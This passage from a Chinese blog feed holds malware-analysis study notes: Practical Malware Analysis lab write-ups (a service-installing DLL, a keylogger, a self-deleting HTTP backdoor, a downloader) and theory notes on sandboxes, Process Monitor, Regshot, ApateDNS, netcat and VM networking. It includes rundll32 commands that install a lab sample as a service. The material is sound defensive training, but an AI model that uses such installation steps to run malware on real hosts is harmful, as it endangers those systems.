id="简要答案-1">简要答案</h2><p>Q1：你怎样才能让这个恶意代码自行安装？</p><p>Q2：在安装之后，你如何让这个恶意代码运行起来？</p><p>Q3：你怎么能找到这个恶意代码是在哪个进程下运行的？</p><p>Q4：你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？</p><p>Q5：这个恶意代码在主机上的感染迹象特征是什么？</p><p>Q6：这个恶意代码是否存在一些有用的网络特征码？</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122868.png"alt="image-20231014104724395" /><figcaption aria-hidden="true">image-20231014104724395</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122869.png"alt="image-20231014104745673" /><figcaption aria-hidden="true">image-20231014104745673</figcaption></figure><h2 id="详细分析-1">详细分析</h2><p>使用PEiD分析其导出表、导入表.导出函数<code>ServiceMain</code>表明，这个恶意代码需要安装成一个服务，使其能够正常运行.这里包括了一些服务操作函数，比如<code>CreateService</code>，以及一些注册表操作函数，如函数<code>RegSetValueEX</code>.导入的网络操作函数，如<code>HttpSendRequest</code>等，表明恶意代码使用了HTTP.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122870.png"alt="image-20231014084906992" /><figcaption aria-hidden="true">image-20231014084906992</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122871.png"alt="image-20231014085536840" /><figcaption aria-hidden="true">image-20231014085536840</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122872.png"alt="image-20231014085613379" /><figcaption aria-hidden="true">image-20231014085613379</figcaption></figure><p>使用strings检查字符串列表.我们看到了一些有趣的字符串，包括注册表位置、域名、一些独特的字符串如<code>IPRIP</code>和<code>serve.html</code>，以及一些编码的字符串.动态分析基础技术可能会告诉我们这些字符串和导入函数如何被使用的.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122873.png"alt="image-20231013193555611" /><figcaption aria-hidden="true">image-20231013193555611</figcaption></figure><p>先用Regshot对注册表做个基线快照，并且使用ProcessExplorer来监控在系统上运行的进程，然后使用<code>rundll32.exe</code>来安装恶意代码，在安装完恶意代码之后，我们使用ProcessExplorer，来确定<code>rundll32.exe</code>已经终止，不在进程列表中了.然后，我们用Regshot工具做第二个快照，来看看恶意代码是否已经在注册表中安装自身了.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 利用rundll32.exe 工具，使用命令 rundll32.exe Lab03-01.dll,installA</span><br><span class="hljs-comment"># 运行恶意代码导出函数便可将恶意代码安装为一个服务.</span><br><span class="hljs-comment"># installA从前面静态分析中得到</span><br>rundll32.exe Lab03-02.dll,installA<br></code></pre></td></tr></table></figure><p>分析快照比对结果.发现恶意代码将自身安装为<code>IPRIP</code>服务，由于这个恶意代码是一个DLL文件，它依赖于一个可执行文件来执行它.事实上，我们在看到<code>ImagePath</code>被设置为<code>svchost.exe</code>，这意味着，这个恶意代码将会在一个<code>svchost.exe</code>进程中启动.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122874.png"alt="image-20231014094117030" /><figcaption aria-hidden="true">image-20231014094117030</figcaption></figure><p>根据字符串查找的线索检查注册表项，我们可以看到其他可能被使用的服务名称，比如<code>6to4 AppNgmt</code>.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122875.png"alt="image-20231014094736934" /><figcaption aria-hidden="true">image-20231014094736934</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122876.png"alt="image-20231014094633180" /><figcaption aria-hidden="true">image-20231014094633180</figcaption></figure><p>开始进行动态分析，我们将运行procmon工具（并清除所有事件），启动ProcessExplorer，以及配置一个虚拟网络，包括ApateDNS、监听端口80的Netcat（因为我们在字符串列表中看到了HTTP）.由于这个恶意代码安装为<code>IPRIP</code>服务，我们可以使用Windows中的net命令来启动它，具体命令如下：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122877.png"alt="image-20231014095227121" /><figcaption aria-hidden="true">image-20231014095227121</figcaption></figure><p>使用进程浏览器查找恶意代码运行的进程，可以得到<code>Lab03-02.dll</code>是由PID为1052的<code>svchost.exe</code>进程加载的.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122878.png"alt="image-20231014095326064" /><figcaption aria-hidden="true">image-20231014095326064</figcaption></figure><p>在ProcessExplorer中，我们选择<code>View→Lower Pane View→DLLs</code>，选择运行为PID为1052的<code>svchost.exe</code>进程.当我们看到<code>Lab03-02.dll</code>被装载时证实了恶意代码在<code>svchost.exe</code>进程中运行.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122879.png"alt="image-20231014100153686" /><figcaption aria-hidden="true">image-20231014100153686</figcaption></figure><p>接下来，我们将注意力转移到网络分析工具上.首先，我们检查ApateDNS，查看恶意代码是否执行了DNS请求.输出结果显示了一个向<code>practicalmalwareanazysis.com</code>的DNS请求，这也匹配到了静态分析得到的字符串列表.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122880.png"alt="image-20231014102157123" /><figcaption aria-hidden="true">image-20231014102157123</figcaption></figure><p>最后分析Netcat结果来完成我们的网络分析.我们看到，恶意代码执行了一个通过80端口的HTTPGET请求（我们让Netcat在80端口上监听，是因为我们在字符串列表中看到了HTTP）.我们多次运行这个测试，数据显示结果对每次运行都是一致的（未能成功观测到）.</p><h1 id="lab-03-03">Lab 03-03</h1><p>Q1：当你使用Process Explorer工具进行监视时，你注意到了什么?</p><p>Q2：你可以找出任何的内存修改行为吗?</p><p>Q3：这个恶意代码在主机上的感染迹象特征是什么?</p><p>Q4：这个恶意代码的目的是什么?</p><h2 id="简要答案-2">简要答案</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122881.png"alt="image-20231014105200733" /><figcaption aria-hidden="true">image-20231014105200733</figcaption></figure><h2 id="详细分析-2">详细分析</h2><p>对于这个实验，我们首先启动ProcessExplorer和procmon工具.<code>Lab03-03.exe</code>可以从命令提示符运行，或者通过双击图标运行.一旦运行之后，<code>La03-03.exe</code>应该在ProcessExplorer中看得到.请注意它是如何创建子进程<code>svchost.exe</code>的，创建之后它便退出了，将<code>svchost.exe</code>进程继续作为一个“孤儿”进程(没有父进程的进程）执行.<code>svchost.exe</code>作为“孤儿”进程是极不寻常而且是高度可疑的.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122882.png"alt="image-20231014110346346" /><figcaption aria-hidden="true">image-20231014110346346</figcaption></figure><p>查看该进程属性，从这个相同的属性页面中，我们选择Strings同时显示在磁盘镜像中和内存镜像中可执行文件的字符串列表.通过在Image和Memory单选按钮之间切换，可以看出两者镜像中的显著差异.内存镜像中有一些可疑字符串，如日志、键盘操作符，表明这个程序很可能是一个击键记录器.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122883.png"alt="image-20231014110948757" /><figcaption aria-hidden="true">image-20231014110948757</figcaption></figure><p>为进行测试，创建文本文件，之后在进程监视器中设置过滤条件查看结果，发现该进程正在写一个日志文件，这与在<code>svchos.exe</code>“孤儿”进程的内存镜像视图中看到的一个字符串相同，打开该日志文件，显示出了刚才在记事本中的击键记录.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122884.png"alt="image-20231014111326609" /><figcaption aria-hidden="true">image-20231014111326609</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122885.png"alt="image-20231014111416534" /><figcaption aria-hidden="true">image-20231014111416534</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122886.png"alt="image-20231014111459029" /><figcaption aria-hidden="true">image-20231014111459029</figcaption></figure><h1 id="lab-03-04">Lab 03-04</h1><h2 id="简要答案-3">简要答案</h2><p>Q1：当你运行这个文件时，会发生什么呢?</p><p>Q2：是什么原因造成动态分析无法有效实施?</p><p>Q3：是否有其他方式来运行这个程序?</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122887.png"alt="image-20231014112009958" /><figcaption aria-hidden="true">image-20231014112009958</figcaption></figure><h2 id="详细分析-3">详细分析</h2><p>我们开始使用静态分析基础技术，研究PE文件结构和字符串列表.我们看到这个恶意代码导入了一些联网功能函数、服务操作函数和注册表操作函数.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122888.png"alt="image-20231014113403301" /><figcaption aria-hidden="true">image-20231014113403301</figcaption></figure><p>在下面的列表中，我们关注到一些有趣的字符串.我们看到域名、注册表位置;像DOWNLOAD、UPLOAD这样的命令字符串，以及HTTP/1.0字符串等.这些表明恶意代码可能是一个HTTP后门程序.字符串-cc、-re、-in应该是一些命令行参数（例如-in可能是install的缩写）.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122889.png"alt="image-20231014113629375" /><figcaption aria-hidden="true">image-20231014113629375</figcaption></figure><p>启动进程浏览器，进程监视器.当我们运行恶意代码后，它立刻进行自我删除.进程浏览器中无特别行为，再查看进程监视器，设置过滤条件，发现该恶意代码创建了一个进程，从而实现自我删除.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122890.png"alt="image-20231014114225466" /><figcaption aria-hidden="true">image-20231014114225466</figcaption></figure><p>尝试使用命令行运行恶意代码，并使用我们在字符串列表中发现的一些命令行参数（-in、-re、-cc），但这些努力都以失败告终，结果程序还是会删除自身.</p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>实验篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH04-动态分析基础技术</title>
    <link href="/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/CH04%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/"/>
    <url>/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/CH04%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="沙箱">1. 沙箱</h1><ul><li>沙盒技术：用于安全运行程序的安全环境，经常被用于执行和分析非可信的代码</li><li>作用：<ul><li>样本是否对硬盘读写，创建了什么文件</li><li>样本是否进行网络连接，连接什么端口</li><li>创建了哪些进程（系统/用户），进程有哪些API函数调用</li><li>相关的可疑文件大小和MD5</li><li>文件是否加壳压缩</li><li>是否是已知病毒</li></ul></li><li>缺点：<ul><li>只能简单地运行可执行程序，如果需要命令行运行，无法触发</li><li>不能记录所有事件，尤其是需要长时间等待的情况</li><li>恶意代码会进行虚拟机检测</li><li>运行环境需要特定的注册表项或文件</li><li>如果是一个DLL，无法正确调用执行</li><li>操作系统的限制</li><li>结论需要安全人员自己总结</li></ul></li></ul><h1 id="运行恶意代码">2. 运行恶意代码</h1><ul><li><p>exe：命令行或双击</p></li><li><p>dll：命令行</p></li><li><p>rundll (window系统自带程序)执行以下步骤：</p><ul><li>分析命令行</li><li>通过 LoadLibrary( ) 加载指定的 DLL</li><li>通过 GetProcAddress( ) 获取<code>entrypoint</code> 函数的地址</li><li>调用<code>entrypoint</code>函数，并传递作为<code>optional arguments</code>的命令行尾</li><li>当<code>entrypoint</code>函数返回时，rundll.exe 将卸载 DLL并退出</li></ul></li><li><p>执行DLL文件中的导出函数</p><ul><li><code>C:\Windows\System32\rundll32.exe ipr32x.dll,Install ServiceName</code></li><li><code>C:\Windows\System32\rundll32.exe rip.dll,Install</code></li><li><code>C:\Windows\System32\rundll32.exe xyzzy.dll,#5</code></li></ul></li></ul><h1 id="进程监视器">3. 进程监视器</h1><ul><li>ProcessMonitor是一款Windows平台下优秀的监视工具，该工具提供了一种可监视特定注册表、文件系统、网络、进程以及线程活动的方法</li><li>Process Monitor能够监视所有系统调用并迅速收集信息。因为WindowsOS总是有许多的系统调用，有时候我们获取到的东西毫无价值，</li><li>Process Monitor通过一个过滤选项卡来解决了这个问题。</li></ul><p><strong>下载地址：</strong>https://learn.microsoft.com/zh-cn/sysinternals/downloads/procmon</p><h1 id="进程浏览器">4. 进程浏览器</h1><ul><li>ProcessExplorer是一款用来执行动态分析的工具，它能够洞察到系统当前进程</li><li>在运行二进制文件之后创建的一个进程，单击进程可以帮助用户查看进程的变化</li></ul><p><strong>下载地址：</strong>https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</p><h1 id="regshot比较注册表快照">5. Regshot比较注册表快照</h1><p>快照比对方法：</p><ol type="1"><li>对“干净”资源列表做快照</li><li>运行恶意代码（提供较充分的运行时间5分钟）</li><li>对恶意代码运行后的“脏”资源列表做快照</li><li>对比“干净”和“脏”快照，获取恶意代码行为结果</li></ol><ul><li>资源名称列表中的差异：发现新建、删除的行为结果</li><li>资源内容的差异：完整性校验，发现修改的行为结果</li></ul><p><strong>缺点</strong>：无法分析中间行为，粗粒度</p><p><strong>下载地址</strong>：https://sourceforge.net/projects/regshot/</p><h1 id="模拟网络">6. 模拟网络</h1><ul><li>目的：避免连接恶意代码的真实服务器（控制服务器）</li><li>工具：<ul><li>ApateDns(FireEye)：ApateDNS是一个用于控制DNS响应的工具，主要用在<strong>本地系统</strong>上的DNS服务器。ApateDNS可以将恶意软件生成的DNS请求重定向到UDP端口53上的指定IP地址的DNS响应。</li><li>nc(Netcat)：作为客户端，最简单的使用方法，”nc hostport”，能建立一个TCP连接，连向指定的主机和端口。作为服务端，“nc -l -p80”，监听任意指定端口的连接请求(inbound connection)，并可做同样的读写操作。很多恶意软件通过端口<strong>80（HTTP）</strong>和<strong>443（HTTPS）</strong>进行通信，因为在大多数系统上，这些端口不会被防火墙阻止。当执行动态恶意软件分析时，可以使用ApateDNS将由恶意软件创建的DNS请求重定向到正在服务器模式下运行Netcat的主机，侦听指定端口上的指定IP地址。</li><li>INetSim：INetSim能够伪造恶意软件可能使用的常见的互联网服务，并回答相应的请求。当恶意软件请求文件时，INetSim将返回该文件。当恶意软件扫描Web服务器时，INetSim将返回IISWeb服务器的名称以保持恶意软件运行。</li></ul></li></ul><p>参考教程：</p><ol type="1"><li><ahref="https://zhuanlan.zhihu.com/p/24923630">动态恶意软件分析工具介绍</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Chapter_1L</title>
    <link href="/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%AE%9E%E9%AA%8C%E7%AF%87/Chapter_1L/"/>
    <url>/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%AE%9E%E9%AA%8C%E7%AF%87/Chapter_1L/</url>
    
    <content type="html"><![CDATA[<h1 id="lab-01-01">Lab 01-01</h1><h2 id="简要答案">简要答案</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458503.png"alt="image-20231029105056073" /><figcaption aria-hidden="true">image-20231029105056073</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458505.png"alt="image-20231029105108794" /><figcaption aria-hidden="true">image-20231029105108794</figcaption></figure><h2 id="详细分析">详细分析</h2><p>上传文件至https://www.virustotal.com/，查看分析结果，基本确认是病毒文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458506.png"alt="image-20231029093502774" /><figcaption aria-hidden="true">image-20231029093502774</figcaption></figure><p>使用PETools进行分析，编译时间保存在<code>IMAGE_NT_HEADERS-&gt;IMAGE_FILE_HEADER-&gt;Time Date Stamp</code>字段.上图为lab01-01.exe，下图为lab01-01.dll，两者编译时间十分接近，说明同属于一个恶意代码包.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458507.png"alt="image-20231029110839606" /><figcaption aria-hidden="true">image-20231029110839606</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458508.png"alt="image-20231029110944278" /><figcaption aria-hidden="true">image-20231029110944278</figcaption></figure><p>使用PEiD查看，未被加壳.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458509.png"alt="image-20231029111230564" /><figcaption aria-hidden="true">image-20231029111230564</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458510.png"alt="image-20231029111245648" /><figcaption aria-hidden="true">image-20231029111245648</figcaption></figure><p>使用Depends查看exe文件导入表，发现一些与文件操作相关的函数，以及FindFirstFile和FindNextFile，表明这个程序在搜索文件系统和复制文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458511.png"alt="image-20231029111849424" /><figcaption aria-hidden="true">image-20231029111849424</figcaption></figure><p>使用strings查看exe文件字符串列表，发现可疑路径<code>kerne1.dll</code>（1代替了l）.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458512.png"alt="image-20231029112339801" /><figcaption aria-hidden="true">image-20231029112339801</figcaption></figure><p>查看dll文件导入表和字符串列表.Kernel32.DLL中框选的两个函数普遍在后门程序中使用，WS2_32表明有联网操作.字符串列表中发现一个IP地址.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458513.png"alt="image-20231029112900307" /><figcaption aria-hidden="true">image-20231029112900307</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458514.png"alt="image-20231029113422934" /><figcaption aria-hidden="true">image-20231029113422934</figcaption></figure><h1 id="lab-01-02">Lab 01-02</h1><h2 id="简要答案-1">简要答案</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458515.png"alt="image-20231029113927070" /><figcaption aria-hidden="true">image-20231029113927070</figcaption></figure><h2 id="详细分析-1">详细分析</h2><p>上传文件至https://www.virustotal.com/，查看分析结果，基本确认是病毒文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458516.png"alt="image-20231029114703781" /><figcaption aria-hidden="true">image-20231029114703781</figcaption></figure><p>使用PEiD进行深度扫描，得到文件加壳信息.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458517.png"alt="image-20231029114812766" /><figcaption aria-hidden="true">image-20231029114812766</figcaption></figure><p>使用free UPX进行脱壳.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458518.png"alt="image-20231029115311898" /><figcaption aria-hidden="true">image-20231029115311898</figcaption></figure><p>查看该程序导入表和字符串列表.得到该恶意程序会创建一个服务，并且有联网操作.字符串列表中看到一个网址，以及Malservice字符串，可能是创建的服务名称.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458519.png"alt="image-20231029115446782" /><figcaption aria-hidden="true">image-20231029115446782</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458520.png"alt="image-20231029115501764" /><figcaption aria-hidden="true">image-20231029115501764</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458521.png"alt="image-20231029115624967" /><figcaption aria-hidden="true">image-20231029115624967</figcaption></figure><h1 id="lab-01-03">Lab 01-03</h1><h2 id="简要答案-2">简要答案</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458522.png"alt="image-20231029140804386" /><figcaption aria-hidden="true">image-20231029140804386</figcaption></figure><h2 id="详细分析-2">详细分析</h2><p>上传文件至https://www.virustotal.com/，查看分析结果，基本确认是病毒文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458523.png"alt="image-20231029141913268" /><figcaption aria-hidden="true">image-20231029141913268</figcaption></figure><p>使用PEiD查看加壳信息，然后查看导入表，发现仅有两个函数，加壳文件往往只有这两个导入函数.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458524.png"alt="image-20231029142003062" /><figcaption aria-hidden="true">image-20231029142003062</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458525.png"alt="image-20231029142334143" /><figcaption aria-hidden="true">image-20231029142334143</figcaption></figure><h1 id="lab-01-04">Lab 01-04</h1><h2 id="简要答案-3">简要答案</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458526.png"alt="image-20231029142553301" /><figcaption aria-hidden="true">image-20231029142553301</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458527.png"alt="image-20231029142603196" /><figcaption aria-hidden="true">image-20231029142603196</figcaption></figure><h2 id="详细分析-3">详细分析</h2><p>上传文件至https://www.virustotal.com/，查看分析结果，基本确认是病毒文件，并且与下载器相关.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458528.png"alt="image-20231029143928383" /><figcaption aria-hidden="true">image-20231029143928383</figcaption></figure><p>使用PEiD查看，文件未被加壳.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458529.png"alt="image-20231029144119268" /><figcaption aria-hidden="true">image-20231029144119268</figcaption></figure><p>使用Depends查看导入表，advapi32.dll的导入函数告诉我们程序做了一些与权限有关的操作.kernel32.dll的导入函数告诉我们程序从资源节中装载数据，并写文件到磁盘中，接着执行磁盘上的一个文件（WinExec）.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458530.png"alt="image-20231029144303728" /><figcaption aria-hidden="true">image-20231029144303728</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458531.png"alt="image-20231029144532400" /><figcaption aria-hidden="true">image-20231029144532400</figcaption></figure><p>使用strings查看字符串列表.看到一个网址，可能是保存下载恶意代码的网络位置.以及一个路径，结合GetWindowsDirectory系统调用，程序可能在该位置创建或修改了文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458532.png"alt="image-20231029144842764" /><figcaption aria-hidden="true">image-20231029144842764</figcaption></figure><p>使用ResourceHacker工具进行分析，图中字符串是在所有PE文件开始的DOS头部中都会包含的错误信息，得出结论，这一资源其实是内嵌的另一个可执行文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458533.png"alt="image-20231029145237236" /><figcaption aria-hidden="true">image-20231029145237236</figcaption></figure><p>导出为二进制文件，继续使用PEiD分析其导入表，看到URLDownloadToFile函数，这是一个恶意下载器普遍使用的函数.并且调用了WinExec函数，可能执行了下载到的文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458534.png"alt="image-20231029145617387" /><figcaption aria-hidden="true">image-20231029145617387</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291458535.png"alt="image-20231029145747097" /><figcaption aria-hidden="true">image-20231029145747097</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>实验篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH03-在虚拟机中分析恶意代码</title>
    <link href="/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/CH03%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    <url>/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/CH03%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="虚拟机概述">1. 虚拟机概述</h1><ul><li>概念：VirtualMachine，指通过软件模拟的具有完整硬件系统功能的、运行在一个完全隔离环境中的完整计算机系统。</li><li>软件：VMware(VMware ACE）、Xen、VirtualBox和KVM等，它们都能在Windows系统上虚拟出多个计算机。</li><li>虚拟机监视器（Virtual MachineMonitor，VMM）是虚拟机技术的核心，它是一层位于操作系统和计算机硬件之间的代码，用来将硬件平台分割成多个虚拟机。主要作用是隔离并且管理上层运行的多个虚拟机，仲裁它们对底层运行在特权模式硬件的访问，并为每个客户操作系统虚拟一套独立于实际硬件的虚拟硬件环境（包括：处理器、内存、I/O设备等）。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121153628.png"alt="image-20231012110721542" /><figcaption aria-hidden="true">image-20231012110721542</figcaption></figure><h1 id="虚拟机网络模式">2. 虚拟机网络模式</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121153629.png"alt="image-20231012112120331" /><figcaption aria-hidden="true">image-20231012112120331</figcaption></figure><h2 id="bridged桥接模式">2.1 Bridged（桥接模式）</h2><ul><li>在bridged模式下，VMWare虚拟出来的虚拟机就像是局域网中的一台独立的主机，它可以访问网内任何一台机器。主机网卡和虚拟网卡的IP地址处于同一个网段，子网掩码、网关、DNS等参数都相同。</li><li>在此种模式下，虚拟机内部的网卡（例如linux下的eth0)直接连到了物理网卡所在的网络上，可以想象为虚拟机和host机处于对等的地位，在网络关系上是平等的，没有谁在谁后面的问题。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121153630.png"alt="image-20231012112631034" /><figcaption aria-hidden="true">image-20231012112631034</figcaption></figure><h2 id="nat地址转换模式">2.2 NAT（地址转换模式）</h2><ul><li>桥接模式配置简单，但如果网络环境是ip资源很缺少或对ip管理比较严格的话，那桥接模式就不太适用了，这时候NAT模式是最好的选择。</li><li>NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。就是让虚拟系统借助NAT(网络地址转换)功能，通过宿主机器所在的网络来访问公网。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121153631.png"alt="image-20231012113616352" /><figcaption aria-hidden="true">image-20231012113616352</figcaption></figure><h2 id="host-only仅主机模式">2.3 Host-Only（仅主机模式）</h2><ul><li><p>Host-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMwareNetwork AdapterVMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121153632.png"alt="image-20231012114151982" /><figcaption aria-hidden="true">image-20231012114151982</figcaption></figure></li></ul><h1 id="搭建虚拟机环境">3.. 搭建虚拟机环境</h1><ul><li>Apatedns：ApateDNS是一个用于控制DNS响应的工具，主要用在本地系统上的DNS服务器。ApateDNS可以欺骗由恶意软件生成的DNS请求至UDP端口53上的指定IP地址。</li><li>Inetsim：INetSim是一个基于Linux的工具，主要用于恶意软件分析，它可以模拟最常见的互联网服务，如http、https、DNS、FTP以及其他的。在Windows机器上执行动态恶意软件分析时，你可以使用和恶意软件分析机器在同一网络中的虚拟机来运行INetSim。INetSim能够伪造恶意软件可能使用的常见的互联网服务，并回答相应的请求。</li></ul><p>参考教程：</p><ol type="1"><li>https://www.cnblogs.com/hyq20135317/p/5515675.html</li><li><ahref="https://blog.csdn.net/m0_46687377/article/details/120733392">恶意代码分析实战——使用Apatedns和Inetsim模拟网络环境_妙蛙种子吃了都会妙妙妙的妙脆角的博客-CSDN博客</a></li></ol><h1 id="使用vmware-进行恶意代码分析的风险">4. 使用VMware进行恶意代码分析的风险</h1><ul><li>虚拟机探测：恶意代码使用反虚拟机技术，使分析变得更加困难</li><li>虚拟机逃逸：虚拟机软件本身具有漏洞，有可能被恶意代码利用</li><li>信息破坏：未知风险，无论如何使用非敏感机器</li></ul><p>参考教程：</p><ol type="1"><li><ahref="https://zhuanlan.zhihu.com/p/65103100">“桥接”和“NAT”方式区别 -知乎 (zhihu.com)</a></li><li><ahref="https://www.cnblogs.com/zhangweimee/p/9467436.html">Vmware虚拟机三种网络模式详解- 醉城、 - 博客园 (cnblogs.com)</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
